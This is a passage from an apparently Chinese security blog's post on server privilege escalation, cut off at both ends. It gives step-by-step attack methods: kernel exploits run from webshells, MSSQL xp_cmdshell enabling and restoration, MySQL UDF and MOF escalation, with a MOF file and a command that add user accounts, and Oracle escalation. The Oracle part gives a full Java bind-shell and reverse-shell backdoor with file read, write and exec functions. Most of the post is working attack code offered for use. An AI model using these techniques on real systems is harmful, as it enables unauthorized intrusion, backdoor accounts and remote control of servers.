class="line">AFA5C7749875646749FCA10725DAA240<span class="class">.B2BServer112</span></span><br><span class="line">最终导致后台用户使用非法的 JSESSIONID 做了合法操作的事情。</span><br></pre></td></tr></table></figure>
<p>与 XSS 结合利用。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2016/04/18/yewuluoji/" data-id="cin5pv33o0004hcfwaxdpu159" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-tiquan" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/04/18/tiquan/" class="article-date">
  <time datetime="2016-04-18T06:53:24.000Z" itemprop="datePublished">2016-04-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/04/18/tiquan/">系统提权</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>提权的方法有很多，服务器上开启的某些服务也能成为提权的途径，当然提权方法多种多样，我见得少，这里就简单介绍一下平民化的几种提权方式：系统提权 + 数据库提权 + DLL 劫持。</p>
<h4 id="u7CFB_u7EDF_u6F0F_u6D1E_u63D0_u6743_uFF1A"><a href="#u7CFB_u7EDF_u6F0F_u6D1E_u63D0_u6743_uFF1A" class="headerlink" title="系统漏洞提权："></a>系统漏洞提权：</h4><p>系统漏洞提权一般就是利用系统自身缺陷，使用 shellcode 来提升权限。Windows 和 Linux 系统均有提权用的可执行文件。<br>Windows exp 一般格式为 MS08067.exe。<br>Linux exp 一般格式为 2.6.18-194 或 2.6.18.c(需要编译)。</p>
<h5 id="Windows__u63D0_u6743_uFF1A"><a href="#Windows__u63D0_u6743_uFF1A" class="headerlink" title="Windows 提权："></a>Windows 提权：</h5><p>方法：<br>1.使用 systeminfo 命令或者查看补丁目录，查看补丁记录，来判断有哪个补丁没打，然后使用相对应的 exp 进行提权。<br>2.找可写目录，上传 cmd.exe、提权 exp 等工具。<br>3.使用 exp 进行提权，加账号等操作。</p>
<p>Tips：<br>渗透过程中经常会遇到管理员禁止了 cmd.exe 的使用，我们该怎么办？禁止了 .exe 文件的上传怎么办？<br>传一个 cmd.exe 上去，任意扩展名(webshell 下运行不管后缀名是什么都会以 .exe 文件运行)。<br>管理员禁止了一些脚本函数的运行，看不到回显怎么办？<br>追加符保存到 txt。<br>在使用 webshell 提权的时候要特别注意：</p>
<ol>
<li>asp 的 webshell 要支持：wscript(wscript.shell/shell.application)，没组件执行不了 cmd。</li>
<li>aspx 能调用 .net 组件来执行 cmd 的命令。</li>
</ol>
<h5 id="Linux__u63D0_u6743_3A"><a href="#Linux__u63D0_u6743_3A" class="headerlink" title="Linux 提权:"></a>Linux 提权:</h5><p>形如 2.6.18.c，需要编译后运行，提权。<br>提权 exp 使用方法：<br>1.使用 uname -a 命令或者 cat /proc/version，来判断系统的内核情况等等，然后使用相对应的 exp 进行提权。<br>2.使 exp 执行即可，一般情况下 Linux 的本地提权要用 nc 反弹出来，因为 Linux 下提升权限后得到的是交互式 shell，需反弹才能进行下一步命令的执行。<br>Tips：<br>1.提权过程中需要为你的提权 exp 赋权，chmod。<br>2.Linux 服务器很多情况下管理员会设置目录权限，我们无法修改，但是一般 /tmp/ 目录不会被设置权限。<br>数据库提权：<br>数据库提权就是利用执行数据库语句、利用数据库函数、扩展存储过程等方式提升服务器用户的权限。<br>数据库提权首先通常需要能登录数据库，所以通常我们拿到 webshell 之后要去网站目录去找数据库连接文件，常在形如 xxx.conf 或 conf.xxx 文件中。</p>
<h4 id="MSSQL__u63D0_u6743_uFF1A"><a href="#MSSQL__u63D0_u6743_uFF1A" class="headerlink" title="MSSQL 提权："></a>MSSQL 提权：</h4><p>原理：<br>SQL Server 提权是利用扩展存储过程来执行系统命令，达到使自己权限提升的目的。<br>SQL Server 的提权一般是调用 xp_cmdshell 函数来提权。</p>
<p>适用环境：<br>1.SQL Server 的服务没有降权,是以默认服务继承的权限来运行的；<br>2.拥有该主机 SQL Server 中的 sa 或管理员的账号和密码。</p>
<p>方法：<br>1.获取当前数据库的一个数据库连接信息，通常包含地址、端口、账号、密码、库名等五个信息；<br>2.连接数据库：</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server=localhost;UID=<span class="keyword">sa</span>;<span class="keyword">PWD</span>=<span class="keyword">sa</span>;database=XXXX;Provider=SQLOLEDB</span><br></pre></td></tr></table></figure>
<p>3.执行 cmd 命令：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master<span class="class">.dbo</span><span class="class">.xp_cmdshell</span> ‘whoami’</span><br></pre></td></tr></table></figure>
<p>可用来提权的存储过程：</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">sp_makewebtask</span></span><br><span class="line">xp_cmdshell</span><br><span class="line">xp_dirtree</span><br><span class="line">xp_fileexist</span><br><span class="line">xp_terminate_process</span><br><span class="line">sp_oamethod</span><br><span class="line">sp_oacreate</span><br><span class="line">xp_regaddmultistring</span><br><span class="line">xp_regdeletekey</span><br><span class="line">xp_regdeletevalue</span><br><span class="line">xp_regenumkeys</span><br><span class="line">xp_regenumvalues</span><br><span class="line">sp_add_job</span><br><span class="line">sp_addtask</span><br><span class="line">xp_regread</span><br><span class="line">xp_regwrite</span><br><span class="line">xp_readwebtask</span><br><span class="line">xp_makewebtask</span><br><span class="line">xp_regremovemultistring</span><br></pre></td></tr></table></figure>
<p>怎么恢复被删除的存储过程：<br>选择 add xp_cmdshell 扩展存储过程执行语句：<br>1.恢复 xp_cmdshell(sp_addextendedproc,xplog70.dll 未被删除)：sp_addextendedproc ‘xp_cmdshell’,’xplog70.dll’–<br>2.恢复 xp_cmdshell(xplog70.dll 被删)：<br>上传 xplog70.dll<br>执行 sp_addextendedproc ‘xp_cmdshell’,’c:\xplog70.dll’–<br>3.恢复 xp_cmdshell(sp_addextendedproc 被删)：dbcc addextendedproc(“xp_cmdshell”,”xplog70.dll”);</p>
<p>怎么开启cmd_shell：</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure ‘show advanced options’, 1<span class="comment">;</span></span><br><span class="line">RECONFIGURE<span class="comment">;</span></span><br><span class="line">EXEC sp_configure ‘xp_cmdshell’, 1<span class="comment">;</span></span><br><span class="line">RECONFIGURE<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<h4 id="MySQL__u63D0_u6743_uFF1A"><a href="#MySQL__u63D0_u6743_uFF1A" class="headerlink" title="MySQL 提权："></a>MySQL 提权：</h4><p>UDF 提权：<br>UDF (用户定义函数)是一类对 MySQL 服务器功能进行扩充的代码，通常使用 C/C++ 编写。<br>通过添加新函数并使用，性质就像使用本地 MySQL 函数 abs() 或 concat()。<br>UDF 也是在拥有低权限 MySQL 账号时比较好用的一种提权方法。</p>
<p>原理：<br>通过添加自定义函数执行 cmd 命令。</p>
<p>适用环境：<br>1.目标主机系统是 Windows（Win2000、XP、Win2003）<br>2.拥有该主机 MySQL 中的某个用户账号，该账号需要有对 MySQL 的 INSERT 和 DELETE 权限。<br>3.最好 MySQL 是默认启动的权限（system）。<br>Linux 下 MySQL 通常以 mysql 启动。</p>
<p>方法：<br>1、获取当前 MySQL 的一个数据库连接信息，通常包含地址、端口、账号、密码、库名等五个信息；<br>2、上传 UDF 提权用的 DLL，并进行数据库连接；<br>3、连接成功后，将自己的 DLL 导出到系统目录下的 DLL 文件；<br>4、使用 SQL 语句创建自定义函数执行 DLL；<br>5、通过 SQL 语句调用创建的函数执行命令；<br>6、删除函数和 DLL（必须先删函数再删 DLL）。</p>
<p>导出路径：<br>需要导出 DLL 到插件路径，例如 D:\Program Files\MySQL\MySQL Server 5.1.3\lib\plugin。</p>
<p>创建自定义函数：<br>create function 函数名 returns string soname ‘导出的DLL路径’;<br>e.g:<br>create function cmdshell returns string soname ‘udf.dll’;<br>如果提示 Function ‘cmdshell’ already exists ，<br>则删掉原来的函数：drop function cmdshell; 再创建。</p>
<p>调用创建的函数：<br>select 创建的函数名 (‘参数列表’);<br>e.g:<br>select cmdshell(“net user username password /add”);</p>
<p>删除函数：<br>drop function 创建的函数名;<br>e.g:<br>drop function cmdshell;</p>
<p>MOF 提权：<br>原理：这个我也不太是很明白，只知道这个 MOF 文件可以编译为可执行文件。</p>
<p>方法：<br>1、找一个可写目录上传 mof 文件， 设上传到 C:/wmpub/nullevt.mof， 代码如下：</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma namespace(“\\\\.\\root\\subscription”)</span><span class="instruction"></span><br><span class="line">instance </span>of __EventFilter as $EventFilter&#123;</span><br><span class="line">EventNamespace = “Root\\Cim<span class="variable">v2</span>”;</span><br><span class="line">Name = “filtP2”;</span><br><span class="line">Query = “Select * From __InstanceModificationEvent ”</span><br><span class="line">“Where TargetInstance Isa \”Win32_LocalTime\” ”</span><br><span class="line">“And TargetInstance.Second = 5”;</span><br><span class="line">Query<span class="class">Language = “WQL”;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="instruction"></span><br><span class="line">instance </span>of ActiveScriptEventConsumer as $Consumer&#123;</span><br><span class="line">Name = “consPCSV2”;</span><br><span class="line">ScriptingEngine = “JScript”;</span><br><span class="line">ScriptText =”var WSH =<span class="instruction"> new </span>ActiveXObject(\”WScript.Shell\”<span class="function">)</span>\nWSH.run(\”net.exe user xxx xxx /add\”<span class="function">)</span>”;//自行修改。</span><br><span class="line">&#125;;</span><br><span class="line"><span class="instruction"></span><br><span class="line">instance </span>of __FilterToConsumerBinding&#123;</span><br><span class="line">Consumer = $Consumer;</span><br><span class="line">Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>2、执行 load_file 及 into dumpfile 把文件导出到正确的位置：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">select</span> <span class="keyword">load_file</span>(‘<span class="keyword">C</span>:/wmpub/nullevt.mof’) <span class="keyword">into</span> <span class="keyword">dumpfile</span> ‘<span class="keyword">c</span>:/windows/system32/wbem/mof/nullevt.mof’</span></span><br></pre></td></tr></table></figure>
<p>3.执行成功后，可修改 MOF 文件中的代码执行其他命令。</p>
<h4 id="Oracle__u63D0_u6743_uFF1A"><a href="#Oracle__u63D0_u6743_uFF1A" class="headerlink" title="Oracle 提权："></a>Oracle 提权：</h4><p>方法 1：<br>原理：oracle 的提权就是利用的 oracle 的扩展，自定义执行命令的功能进行提权，只不过 oracle 是用 java 脚本来扩展。</p>
<p>步骤：<br>1.利用已知的 Oracle 用户名连上数据库，并创建 java 提权函数。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:/WINDOWS/system32&gt;sqlplus /nolog</span><br><span class="line">SQL*Plus: Release <span class="number">9.2</span><span class="number">.0</span><span class="number">.1</span><span class="number">.0</span> – Production on 星期日 <span class="number">8</span>月 <span class="number">31</span> <span class="number">14</span>:<span class="number">01</span>:<span class="number">43</span> <span class="number">2008</span></span><br><span class="line">Copyright (c) <span class="number">1982</span>, <span class="number">2002</span>, Oracle Corporation. All rights reserved.</span><br><span class="line">SQL&gt; conn ysreal/ysreal@(description=(address_list=(address=(protocol=tcp)(host=</span><br><span class="line"><span class="number">10.100</span><span class="number">.0</span><span class="number">.239</span>)(port=<span class="number">1521</span>)))(connect_data=(SERVICE_NAME=WORK)));</span><br></pre></td></tr></table></figure>
<p>已连接。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt;</span><br><span class="line">SQL&gt; create or replace and compile java source named paeq as</span><br><span class="line"><span class="number">2</span> import java.io.*;</span><br><span class="line"><span class="number">3</span> import java.net.*;</span><br><span class="line"><span class="number">4</span> <span class="keyword">public</span> <span class="keyword">class</span> PAEQ&#123;</span><br><span class="line"><span class="number">5</span> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">listFolder</span><span class="params">(String path)</span></span>&#123;</span><br><span class="line"><span class="number">6</span> File f=null;</span><br><span class="line"><span class="number">7</span> String str=””;</span><br><span class="line"><span class="number">8</span> f=<span class="keyword">new</span> File(path);</span><br><span class="line"><span class="number">9</span> String[] files=f.<span class="built_in">list</span>();</span><br><span class="line"><span class="number">10</span> <span class="keyword">if</span>(files!=null)</span><br><span class="line"><span class="number">11</span> <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;files.length;i++)&#123;</span><br><span class="line"><span class="number">12</span> str+=files[i]+”/r/n”;</span><br><span class="line"><span class="number">13</span> &#125;</span><br><span class="line"><span class="number">14</span> <span class="keyword">return</span> str;</span><br><span class="line"><span class="number">15</span> &#125;</span><br><span class="line"><span class="number">16</span> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">saveFile</span><span class="params">(String filepath,String value)</span></span>&#123;</span><br><span class="line"><span class="number">17</span> FileOutputStream fos=null;</span><br><span class="line"><span class="number">18</span> <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">19</span> fos=<span class="keyword">new</span> FileOutputStream(filepath);</span><br><span class="line"><span class="number">20</span> fos.write(value.getBytes());</span><br><span class="line"><span class="number">21</span> <span class="keyword">return</span> “OK”;</span><br><span class="line"><span class="number">22</span> &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="number">23</span> <span class="keyword">return</span> e.getMessage();</span><br><span class="line"><span class="number">24</span> &#125; finally&#123;</span><br><span class="line"><span class="number">25</span> <span class="keyword">if</span>(fos!=null)&#123;</span><br><span class="line"><span class="number">26</span> <span class="keyword">try</span> &#123;fos.close();&#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line"><span class="number">27</span> &#125;</span><br><span class="line"><span class="number">28</span> &#125;</span><br><span class="line"><span class="number">29</span> &#125;</span><br><span class="line"><span class="number">30</span> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readFile</span><span class="params">(String pathfile,String code)</span></span>&#123;</span><br><span class="line"><span class="number">31</span> BufferedReader br=null;</span><br><span class="line"><span class="number">32</span> String value=””;</span><br><span class="line"><span class="number">33</span> <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">34</span> br=<span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(<span class="keyword">new</span> FileInputStream(pathfile</span><br><span class="line">),code));</span><br><span class="line"><span class="number">35</span> String s=null;</span><br><span class="line"><span class="number">36</span> <span class="keyword">while</span>((s=br.readLine())!=null)&#123;</span><br><span class="line"><span class="number">37</span> value+=s;</span><br><span class="line"><span class="number">38</span> &#125;</span><br><span class="line"><span class="number">39</span> <span class="keyword">return</span> value;</span><br><span class="line"><span class="number">40</span> &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="number">41</span> <span class="keyword">return</span> e.getMessage();</span><br><span class="line"><span class="number">42</span> &#125; finally&#123;</span><br><span class="line"><span class="number">43</span> <span class="keyword">if</span>(br!=null)&#123;<span class="keyword">try</span> &#123;br.close();&#125; <span class="keyword">catch</span> (IOException e) &#123;&#125;&#125;</span><br><span class="line"><span class="number">44</span> &#125;</span><br><span class="line"><span class="number">45</span> &#125;</span><br><span class="line"><span class="number">46</span> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">execFile</span><span class="params">(String filepath,String code)</span></span>&#123;</span><br><span class="line"><span class="number">47</span> <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="number">48</span> Runtime rt=Runtime.getRuntime();</span><br><span class="line"><span class="number">49</span> String output=””;</span><br><span class="line"><span class="number">50</span> InputStreamReader isr = null;</span><br><span class="line"><span class="number">51</span> <span class="keyword">char</span>[] bufferC=<span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">1024</span>];</span><br><span class="line"><span class="number">52</span> <span class="keyword">try</span>&#123;</span><br><span class="line"><span class="number">53</span> Process ps=rt.exec(filepath);</span><br><span class="line"><span class="number">54</span> isr=<span class="keyword">new</span> InputStreamReader(ps.getInputStream(),code);</span><br><span class="line"><span class="number">55</span> <span class="keyword">while</span>((i=isr.read(bufferC,<span class="number">0</span>,bufferC.length))!=-<span class="number">1</span>)&#123;</span><br><span class="line"><span class="number">56</span> output+=<span class="keyword">new</span> String(bufferC,<span class="number">0</span>,i);</span><br><span class="line"><span class="number">57</span> &#125;</span><br><span class="line"><span class="number">58</span> <span class="keyword">return</span> output;</span><br><span class="line"><span class="number">59</span> &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line"><span class="number">60</span> <span class="keyword">return</span> e.getMessage();</span><br><span class="line"><span class="number">61</span> &#125;finally&#123;</span><br><span class="line"><span class="number">62</span> <span class="keyword">if</span>(isr!=null)<span class="keyword">try</span> &#123;isr.close();&#125; <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line"><span class="number">63</span> &#125;</span><br><span class="line"><span class="number">64</span> &#125;</span><br><span class="line"><span class="number">65</span> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">bindShell</span><span class="params">(<span class="keyword">int</span> port)</span></span>&#123;</span><br><span class="line"><span class="number">66</span> ServerSocket ss=null;</span><br><span class="line"><span class="number">67</span> Socket s=null;</span><br><span class="line"><span class="number">68</span> <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">69</span> ss = <span class="keyword">new</span> ServerSocket(port);</span><br><span class="line"><span class="number">70</span> s=ss.accept();</span><br><span class="line"><span class="number">71</span> <span class="keyword">new</span> optShell(ss,s).start();</span><br><span class="line"><span class="number">72</span></span><br><span class="line"><span class="number">73</span> <span class="keyword">return</span> “OK”;</span><br><span class="line"><span class="number">74</span> &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="number">75</span> <span class="keyword">return</span> e.getMessage();</span><br><span class="line"><span class="number">76</span> &#125;</span><br><span class="line"><span class="number">77</span> &#125;</span><br><span class="line"><span class="number">78</span> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">reverseShell</span><span class="params">(String host,<span class="keyword">int</span> port)</span></span>&#123;</span><br><span class="line"><span class="number">79</span> Socket s=null;</span><br><span class="line"><span class="number">80</span> <span class="keyword">try</span>&#123;</span><br><span class="line"><span class="number">81</span> s=<span class="keyword">new</span> Socket(host,port);</span><br><span class="line"><span class="number">82</span> <span class="keyword">new</span> optShell(null,s).start();</span><br><span class="line"><span class="number">83</span> <span class="keyword">return</span> “OK”;</span><br><span class="line"><span class="number">84</span> &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line"><span class="number">85</span> <span class="keyword">return</span> e.getMessage();</span><br><span class="line"><span class="number">86</span> &#125;</span><br><span class="line"><span class="number">87</span> &#125;</span><br><span class="line"><span class="number">88</span> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> optShell extends Thread&#123;</span><br><span class="line"><span class="number">89</span> OutputStream os=null;</span><br><span class="line"><span class="number">90</span> InputStream is=null;</span><br><span class="line"><span class="number">91</span> ServerSocket ss;</span><br><span class="line"><span class="number">92</span> Socket s;</span><br><span class="line"><span class="number">93</span> <span class="function"><span class="keyword">public</span> <span class="title">optShell</span><span class="params">(ServerSocket ss,Socket s)</span></span>&#123;</span><br><span class="line"><span class="number">94</span> <span class="keyword">this</span>.ss=ss;</span><br><span class="line"><span class="number">95</span> <span class="keyword">this</span>.s=s;</span><br><span class="line"><span class="number">96</span> <span class="keyword">try</span>&#123;</span><br><span class="line"><span class="number">97</span> <span class="keyword">this</span>.is=s.getInputStream();</span><br><span class="line"><span class="number">98</span> <span class="keyword">this</span>.os=s.getOutputStream();</span><br><span class="line"><span class="number">99</span> &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line"><span class="number">100</span> <span class="keyword">if</span>(os!=null)<span class="keyword">try</span> &#123;os.close();&#125; <span class="keyword">catch</span>(Exception ex) &#123;&#125;</span><br><span class="line"><span class="number">101</span> <span class="keyword">if</span>(is!=null)<span class="keyword">try</span> &#123;is.close();&#125; <span class="keyword">catch</span>(Exception ex) &#123;&#125;</span><br><span class="line"><span class="number">102</span> <span class="keyword">if</span>(s!=null)<span class="keyword">try</span> &#123;s.close();&#125; <span class="keyword">catch</span>(Exception ex) &#123;&#125;</span><br><span class="line"><span class="number">103</span> <span class="keyword">if</span>(ss!=null)<span class="keyword">try</span> &#123;ss.close();&#125; <span class="keyword">catch</span>(Exception ex) &#123;&#125;</span><br><span class="line"><span class="number">104</span> &#125;</span><br><span class="line"><span class="number">105</span> &#125;</span><br><span class="line"><span class="number">106</span> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="number">107</span> BufferedReader br=<span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line"><span class="number">108</span> String line=””;</span><br><span class="line"><span class="number">109</span> String cmdhelp=”Command:/r/nlist /r/nsave/r/nread/r/nexec/r/nexit/r/n”;</span><br><span class="line"><span class="number">110</span> <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">111</span> <span class="comment">//os.write(cmdhelp.getBytes());</span></span><br><span class="line"><span class="number">112</span> line=br.readLine();</span><br><span class="line"><span class="number">113</span> <span class="keyword">while</span>(!”<span class="built_in">exit</span>”.equals(line))&#123;</span><br><span class="line"><span class="number">114</span> <span class="keyword">if</span>(line.length()&gt;<span class="number">3</span>)&#123;</span><br><span class="line"><span class="number">115</span> StringBuffer sb=<span class="keyword">new</span> StringBuffer(line.trim());</span><br><span class="line"><span class="number">116</span> String cmd=sb.substring(<span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line"><span class="number">117</span> <span class="keyword">if</span>(cmd.equals(“<span class="built_in">list</span>”))&#123;</span><br><span class="line"><span class="number">118</span> os.write(“input you path:/r/n”.getBytes());</span><br><span class="line"><span class="number">119</span> line=br.readLine();</span><br><span class="line"><span class="number">120</span> os.write(listFolder(line).getBytes());</span><br><span class="line"><span class="number">121</span> &#125;<span class="keyword">else</span> <span class="keyword">if</span>(“save”.equals(cmd))&#123;</span><br><span class="line"><span class="number">122</span> os.write(“input you filepath:/r/n”.getBytes());</span><br><span class="line"><span class="number">123</span> line=br.readLine();</span><br><span class="line"><span class="number">124</span> os.write(“input you value:/r/n”.getBytes());</span><br><span class="line"><span class="number">125</span> os.write(saveFile(line,br.readLine()).getBytes());</span><br><span class="line"><span class="number">126</span> &#125;<span class="keyword">else</span> <span class="keyword">if</span>(“read”.equals(cmd))&#123;</span><br><span class="line"><span class="number">127</span> os.write(“input you filepath:/r/n”.getBytes());</span><br><span class="line"><span class="number">128</span> line=br.readLine();</span><br><span class="line"><span class="number">129</span> os.write(“input you code examle:GBK/r/n”.getBytes());</span><br><span class="line"><span class="number">130</span> os.write(readFile(line,br.readLine()).getBytes());</span><br><span class="line"><span class="number">131</span> &#125;<span class="keyword">else</span> <span class="keyword">if</span>(“exec”.equals(cmd))&#123;</span><br><span class="line"><span class="number">132</span> os.write(“input you run filepath:/r/n”.getBytes());</span><br><span class="line"><span class="number">133</span> line=br.readLine();</span><br><span class="line"><span class="number">134</span> os.write(“input you code examle:GBK/r/n”.getBytes());</span><br><span class="line"><span class="number">135</span> os.write(execFile(line,br.readLine()).getBytes());</span><br><span class="line"><span class="number">136</span> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="number">137</span> os.write(cmdhelp.getBytes());</span><br><span class="line"><span class="number">138</span> &#125;</span><br><span class="line"><span class="number">139</span> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="number">140</span> os.write(cmdhelp.getBytes());</span><br><span class="line"><span class="number">141</span> &#125;</span><br><span class="line"><span class="number">142</span> line=br.readLine();</span><br><span class="line"><span class="number">143</span> &#125;</span><br><span class="line"><span class="number">144</span> &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="number">145</span> e.printStackTrace();</span><br><span class="line"><span class="number">146</span> &#125;finally&#123;</span><br><span class="line"><span class="number">147</span> <span class="keyword">if</span>(os!=null)<span class="keyword">try</span> &#123;os.close();&#125; <span class="keyword">catch</span>(Exception e) &#123;&#125;</span><br><span class="line"><span class="number">148</span> <span class="keyword">if</span>(is!=null)<span class="keyword">try</span> &#123;is.close();&#125; <span class="keyword">catch</span>(Exception e) &#123;&#125;</span><br><span class="line"><span class="number">149</span> <span class="keyword">if</span>(s!=null)<span class="keyword">try</span> &#123;s.close();&#125; <span class="keyword">catch</span>(Exception e) &#123;&#125;</span><br><span class="line"><span class="number">150</span> <span class="keyword">if</span>(ss!=null)<span class="keyword">try</span> &#123;ss.close();&#125; <span class="keyword">catch</span>(Exception e) &#123;&#125;</span><br><span class="line"><span class="number">151</span> &#125;</span><br><span class="line"><span class="number">152</span> &#125;</span><br><span class="line"><span class="number">153</span> &#125;</span><br><span class="line"><span class="number">154</span> &#125;</span><br><span class="line"><span class="number">155</span> 